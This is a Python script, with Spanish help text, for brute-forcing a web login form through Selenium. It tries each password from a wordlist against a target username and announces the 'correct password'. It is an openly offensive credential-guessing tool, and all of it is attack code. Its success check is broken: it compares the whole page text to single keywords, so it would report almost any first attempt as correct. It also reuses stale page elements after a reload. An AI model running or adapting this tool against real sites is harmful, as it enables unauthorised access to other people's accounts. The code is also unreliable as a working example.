import argparse
from bs4 import BeautifulSoup
from termcolor import colored
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

browser = webdriver.Chrome()
parser = argparse.ArgumentParser(
    description="Bruteforce el formulario de login de una pagina")

parser.add_argument('--url', help='url de la pagina deseada', required=True)
parser.add_argument(
    '--username', help='nombre del usuario o email del target', required=True)
parser.add_argument(
    '--uin', help='nombre del id o name del input del formulario para el usuario', required=True)
parser.add_argument(
    '--pin', help='nombre del id o name del input del formulario para la contrasena', required=True)
parser.add_argument(
    '--bin', help='nombre del boton para hacer login en el formulario', required=True)
parser.add_argument(
    '--wordlist', help='*opcional* ubicacion de lista de contrasenas')


args = parser.parse_args()
default_wordlist = './wordlist.txt'
possible_failed_attempts_keywords = [
    'forgot', 'olvidaste', 'incorrect', 'incorrecta', 'incorrecto']


if args.wordlist:
    default_wordlist = args.wordlist


def run_browser():
    browser.get((args.url))
    usernameInput = browser.find_element_by_name(args.uin)
    passwordInput = browser.find_element_by_name(args.pin)
    loginButton = browser.find_element_by_name(args.bin)
    return usernameInput, passwordInput, loginButton


def crack(password, usernameInput, passwordInput, loginButton):
    password = password.strip()
    usernameInput.send_keys(args.username)
    passwordInput.send_keys(password)
    loginButton.click()

    time.sleep(5)

    content = BeautifulSoup(browser.page_source, 'lxml')

    if content.text in possible_failed_attempts_keywords:
        run_browser()
    else:
        print(f'[+] Correct password is {password}')
        exit()


try:
    with open(default_wordlist, 'r') as passwords:
        usernameInput, passwordInput, loginButton = run_browser()
        for password in passwords:
            crack(password, usernameInput, passwordInput, loginButton)

except FileNotFoundError:
    print('[-] Wordlist no existe')
